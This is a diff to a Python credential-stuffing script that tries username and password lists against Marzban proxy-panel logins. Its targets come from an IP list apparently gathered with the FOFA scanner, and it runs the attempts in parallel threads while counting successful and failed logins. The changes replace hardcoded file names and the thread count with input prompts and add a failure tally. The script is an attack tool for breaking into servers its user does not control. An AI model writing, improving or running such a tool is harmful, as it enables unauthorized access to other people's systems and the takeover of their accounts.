@@ -3,15 +3,14 @@ import os
 import requests
 from requests.exceptions import Timeout
 from flask import Flask
-from keep_alive import keep_alive
 import time
 import urllib3
 from datetime import datetime
 
-keep_alive()
+
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
-auth = "b.txt"#"admin.txt"#cred.txt
+auth = input("please enter your pass file: ")
 with open(auth, "r") as credentials:
   credential = credentials.read().splitlines()
 
@@ -38,6 +37,7 @@ good = 0
 bad = 0
 execption = 0
 total = 0
+fail = 0
 
 ti = datetime.now()
 def display():
@@ -48,10 +48,11 @@ def display():
   print(f"{colors.LGREEN} good          =>  {good} {colors.RESET}")
   print(f"{colors.LRED} bad           =>  {bad} {colors.RESET}")
   print(f"{colors.LPURPLE} execption  =>  {execption} {colors.RESET}")
+  print(f"{colors.LPURPLE} fail  =>  {fail} {colors.RESET}")
 
   print(datetime.now())
 
-ip_file = "fofa(marzban).txt"
+ip_file = input("please enter your ip : ")
 with open(ip_file, "r") as url:
   url2 = url.readlines()
 URL = url2
@@ -70,6 +71,7 @@ def Marzban(url3):
   global execption
   global timeout
   global total
+  global fail
 
   total += 1
   #display()
@@ -123,7 +125,8 @@ def Marzban(url3):
             break
           elif "Incorrect" in response.json().get("detail").strip():
             #print(f"{colors.GREY}=> {colors.RESET}  {colors.LRED} failed :{url{colors.RESET}")
-            #display()
+            fail += 1
+            display()
             continue
           else:
             #print(f"{colors.GREY}=> {colors.RESET} {colors.LPURPLE} Exeption occured : {url3} {response.text} {colors.RESET} ")
@@ -156,9 +159,9 @@ def Marzban(url3):
       Bad.flush()  
     display()
 def main():
-
+  Worker = input("please enter Worker : ")
   with concurrent.futures.ThreadPoolExecutor(
-      max_workers=70) as executor:  #Adjust max_workers as needed
+      max_workers=int(Worker)) as executor:  #Adjust max_workers as needed
     executor.map(Marzban, url2)
 
 
